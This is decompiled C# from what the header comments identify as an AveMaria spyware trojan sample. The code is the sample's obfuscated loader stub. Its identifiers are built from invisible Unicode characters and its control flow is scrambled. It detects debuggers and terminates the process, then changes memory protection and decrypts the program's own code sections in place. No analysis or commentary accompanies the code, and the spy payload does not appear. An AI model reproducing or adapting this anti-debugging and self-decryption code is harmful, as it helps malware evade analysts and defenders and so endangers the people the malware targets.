// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: SymDocumentT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A35AB172-155F-47C9-B416-B8693D98829F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.AveMaria.gen-c4a9fe032f1fece9a3524497e7884a14f467a21eeb0edf87307be8dded1663b2.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E() => \u003CModule\u003E.\u202D‍‎‍⁫‫⁭‎⁫‮‌⁮⁮⁬‪‪⁮⁯‍‫‮​⁫⁮‫⁪⁮‍‌⁮​⁮⁭‬⁮⁬⁭‫‭‎‮();

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u200E⁯‬⁮⁫‎⁭⁮‏⁮‏‬‌⁬‫‬⁯‌‪‮⁭‍⁭​⁪⁬⁮‪‫⁭‭‮‍‫‪‌‬‭‮‎‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
  internal static extern bool \u206E‎⁫‬‬‎‬‭‫‍‮‫‬‮⁬‫⁯⁯⁮⁬‫‫⁬⁬⁬‍⁮⁯⁪⁪​‏⁪‫‭⁯‮​‫‫‮(
    [In] IntPtr obj0,
    [In] ref bool obj1);

  internal static unsafe void \u202D‍‎‍⁫‫⁭‎⁫‮‌⁮⁮⁬‪‪⁮⁯‍‫‮​⁫⁮‫⁪⁮‍‌⁮​⁮⁭‬⁮⁬⁭‫‭‎‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
    bool flag1 = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
label_1:
    int num1 = 124843903;
    while (true)
    {
      uint num2;
      uint num3;
      uint num4;
      uint num5;
      int index;
      uint* numPtr1;
      uint num6;
      uint[] numArray1;
      uint[] numArray2;
      int num7;
      uint num8;
      bool flag2;
      uint num9;
      uint num10;
      uint* numPtr2;
      uint num11;
      uint num12;
      uint* numPtr3;
      uint num13;
      ushort num14;
      uint num15;
      int num16;
      switch ((num2 = (uint) (num1 ^ 1342119474)) % 63U)
      {
        case 0:
          \u003CModule\u003E.\u200E⁯‬⁮⁫‎⁭⁮‏⁮‏‬‌⁬‫‬⁯‌‪‮⁭‍⁭​⁪⁬⁮‪‫⁭‭‮‍‫‪‌‬‭‮‎‮((IntPtr) (void*) numPtr2, num6 << 2, num12, ref num12);
          num1 = (int) num2 * -1433436682 ^ 1037976857;
          continue;
        case 1:
          numPtr1 += 8;
          num1 = 110812303;
          continue;
        case 2:
          int num17 = ((int) num4 ^ (int) *numPtr3++) + (int) num11 + (int) num13 * (int) num5;
          num4 = num11;
          num11 = num5;
          num5 = (uint) num17;
          num1 = 1022582733;
          continue;
        case 3:
          ++num8;
          num1 = (int) num2 * -252246190 ^ -393968400;
          continue;
        case 4:
          ++num3;
          num1 = 2071028625;
          continue;
        case 5:
          num13 = 2893739383U;
          num1 = (int) num2 * 699661874 ^ -278147741;
          continue;
        case 6:
          num5 = 968696915U;
          \u003CModule\u003E.\u206E‎⁫‬‬‎‬‭‫‍‮‫‬‮⁬‫⁯⁯⁮⁬‫‫⁬⁬⁬‍⁮⁯⁪⁪​‏⁪‫‭⁯‮​‫‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * -461127532 ^ 2051973917;
          continue;
        case 7:
          goto label_1;
        case 8:
          ++num7;
          num1 = (int) num2 * -1566532936 ^ 188170657;
          continue;
        case 9:
          int num18;
          num1 = num18 = index >= 16 ? 1414964687 : (num18 = 946028023);
          continue;
        case 10:
          numArray1 = new uint[16];
          numArray2 = new uint[16];
          num1 = (int) num2 * 1507865292 ^ 1938174103;
          continue;
        case 11:
          \u003CModule\u003E.\u206E‎⁫‬‬‎‬‭‫‍‮‫‬‮⁬‫⁯⁯⁮⁬‫‫⁬⁬⁬‍⁮⁯⁪⁪​‏⁪‫‭⁯‮​‫‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * -147318702 ^ 1438333750;
          continue;
        case 12:
          num13 = num5 >> 7 | num5 << 25;
          num1 = 1127260549;
          continue;
        case 13:
          int num19 = flag2 ? -916606428 : (num19 = -685163102);
          num1 = num19 ^ (int) num2 * 567632142;
          continue;
        case 14:
          Environment.FailFast((string) null);
          num1 = (int) num2 * 1491589857 ^ -1505302649;
          continue;
        case 15:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          numArray1[1] = numArray1[1] * numArray2[1];
          numArray1[2] = numArray1[2] + numArray2[2];
          num1 = (int) num2 * -1387519095 ^ -256077093;
          continue;
        case 16:
          num7 = 0;
          num1 = 43088331;
          continue;
        case 17:
          int num20;
          num1 = num20 = num9 < num6 ? 1323895684 : (num20 = 1309560480);
          continue;
        case 18:
          num4 = num11 >> 5 | num11 << 27;
          num1 = (int) num2 * 659603504 ^ -1749378632;
          continue;
        case 19:
          num8 = 0U;
          num1 = (int) num2 * -1320870199 ^ -1630102685;
          continue;
        case 20:
          num12 = 64U;
          num1 = (int) num2 * -724348428 ^ 1848946600;
          continue;
        case 21:
          numArray1[8] = numArray1[8] + numArray2[8];
          num1 = (int) num2 * -439600756 ^ 1141231252;
          continue;
        case 22:
          \u003CModule\u003E.\u206E‎⁫‬‬‎‬‭‫‍‮‫‬‮⁬‫⁯⁯⁮⁬‫‫⁬⁬⁬‍⁮⁯⁪⁪​‏⁪‫‭⁯‮​‫‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * 2014467289 ^ 1379605393;
          continue;
        case 23:
          num9 = 0U;
          num1 = (int) num2 * 934138780 ^ -1097469467;
          continue;
        case 24:
          num1 = (int) num2 * -1602068906 ^ -127927549;
          continue;
        case 25:
          int num21;
          num1 = num21 = num10 == 0U ? 261643413 : (num21 = 479105262);
          continue;
        case 26:
          ++num9;
          num1 = (int) num2 * 1270436144 ^ 1691475281;
          continue;
        case 27:
          numArray1[7] = numArray1[7] * numArray2[7];
          num1 = (int) num2 * -1414881934 ^ -674591848;
          continue;
        case 28:
          num11 = num13 >> 3 | num13 << 29;
          num1 = (int) num2 * -1214859704 ^ 1489340671;
          continue;
        case 29:
          int num22 = num12 != 64U ? 1747108625 : (num22 = 1259747908);
          num1 = num22 ^ (int) num2 * 1114820421;
          continue;
        case 30:
          byte* numPtr4 = hinstance + *(uint*) (hinstance + 60);
          num14 = *(ushort*) (numPtr4 + 6);
          ushort num23 = *(ushort*) (numPtr4 + 20);
          flag2 = false;
          numPtr2 = (uint*) null;
          num6 = 0U;
          numPtr1 = (uint*) (numPtr4 + 24 + (int) num23);
          num1 = (int) num2 * -2016444352 ^ 1010184805;
          continue;
        case 31:
          numArray1[3] = numArray1[3] ^ numArray2[3];
          num1 = (int) num2 * 60641368 ^ -1096233831;
          continue;
        case 32:
          numArray1[10] = numArray1[10] * numArray2[10];
          num1 = (int) num2 * 1958835143 ^ 1698541128;
          continue;
        case 33:
          numPtr3 = (uint*) (hinstance + (flag1 ? numPtr1[3] : numPtr1[1]));
          num15 = numPtr1[2] >> 2;
          num1 = 2005124734;
          continue;
        case 34:
          Environment.FailFast((string) null);
          num1 = (int) num2 * -724401920 ^ -1916076306;
          continue;
        case 35:
          index = 0;
          num1 = (int) num2 * -1319965858 ^ 1689585928;
          continue;
        case 36:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          num1 = (int) num2 * 906057105 ^ 1672980508;
          continue;
        case 37:
          num16 = (int) *numPtr1;
          break;
        case 38:
          goto label_3;
        case 39:
          goto label_48;
        case 40:
          Environment.FailFast((string) null);
          num1 = (int) num2 * 1042482372 ^ 228088588;
          continue;
        case 41:
          num1 = (int) num2 * 1986963256 ^ 732349697;
          continue;
        case 42:
          uint* numPtr5 = numPtr1;
          uint* numPtr6 = (uint*) ((IntPtr) numPtr5 + 4);
          int num24 = (int) *numPtr5;
          uint* numPtr7 = numPtr6;
          numPtr1 = (uint*) ((IntPtr) numPtr7 + 4);
          int num25 = (int) *numPtr7;
          num10 = (uint) (num24 * num25);
          int num26;
          num1 = num26 = num10 == 2721863720U ? 1107825032 : (num26 = 979616644);
          continue;
        case 43:
          num11 = 1701045670U;
          num1 = (int) num2 * 1919291966 ^ 1224527544;
          continue;
        case 44:
          num1 = (int) num2 * -777143104 ^ -219508322;
          continue;
        case 45:
          if (flag1)
          {
            num16 = (int) numPtr1[2];
            break;
          }
          num1 = 361141524;
          continue;
        case 46:
          numArray1[4] = numArray1[4] * numArray2[4];
          numArray1[5] = numArray1[5] + numArray2[5];
          num1 = (int) num2 * -505416749 ^ -1995012352;
          continue;
        case 47:
          numArray1[13] = numArray1[13] * numArray2[13];
          num1 = (int) num2 * 1240966790 ^ 797222845;
          continue;
        case 48:
          numArray1[14] = numArray1[14] + numArray2[14];
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num1 = (int) num2 * -119038609 ^ 920098162;
          continue;
        case 49:
          numArray1[9] = numArray1[9] ^ numArray2[9];
          num1 = (int) num2 * -546649371 ^ 554772171;
          continue;
        case 50:
          num5 = num4 >> 11 | num4 << 21;
          ++index;
          num1 = (int) num2 * -1295083550 ^ 300222216;
          continue;
        case 51:
          int num27 = flag2 ? -149366379 : (num27 = -906790568);
          num1 = num27 ^ (int) num2 * -1493932936;
          continue;
        case 52:
          uint* numPtr8 = numPtr2;
          int num28 = (int) *numPtr8 ^ (int) numArray1[(int) num3 & 15];
          *numPtr8 = (uint) num28;
          numArray1[(int) num3 & 15] = (uint) (((int) numArray1[(int) num3 & 15] ^ (int) *numPtr2++) + 1035675673);
          num1 = 1952271949;
          continue;
        case 53:
          numPtr2 = (uint*) (hinstance + (flag1 ? numPtr1[3] : numPtr1[1]));
          \u003CModule\u003E.\u206E‎⁫‬‬‎‬‭‫‍‮‫‬‮⁬‫⁯⁯⁮⁬‫‫⁬⁬⁬‍⁮⁯⁪⁪​‏⁪‫‭⁯‮​‫‫‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = 702059155;
          continue;
        case 54:
          numArray1[index] = num5;
          numArray2[index] = num11;
          num1 = 100823109;
          continue;
        case 55:
          numArray1[11] = numArray1[11] + numArray2[11];
          numArray1[12] = numArray1[12] ^ numArray2[12];
          num1 = (int) num2 * -1913621667 ^ -2042503781;
          continue;
        case 56:
          int num29;
          num1 = num29 = num7 < (int) num14 ? 624784258 : (num29 = 808404307);
          continue;
        case 57:
          num4 = 102328257U;
          num1 = (int) num2 * 864340470 ^ 1653473360;
          continue;
        case 58:
          int num30;
          num1 = num30 = num8 < num15 ? 827609887 : (num30 = 261643413);
          continue;
        case 59:
          int num31 = flag2 ? -231812554 : (num31 = -486074493);
          num1 = num31 ^ (int) num2 * 776961622;
          continue;
        case 60:
          num3 = 0U;
          num1 = 778358397;
          continue;
        case 61:
          int num32 = !flag2 ? 947195962 : (num32 = 192185324);
          num1 = num32 ^ (int) num2 * 758967721;
          continue;
        case 62:
          Environment.FailFast((string) null);
          num1 = (int) num2 * -393226547 ^ -1895142504;
          continue;
        default:
          goto label_68;
      }
      num6 = (uint) num16 >> 2;
      num1 = 2080080851;
    }
label_3:
    return;
label_48:
    return;
label_68:;
  }
}
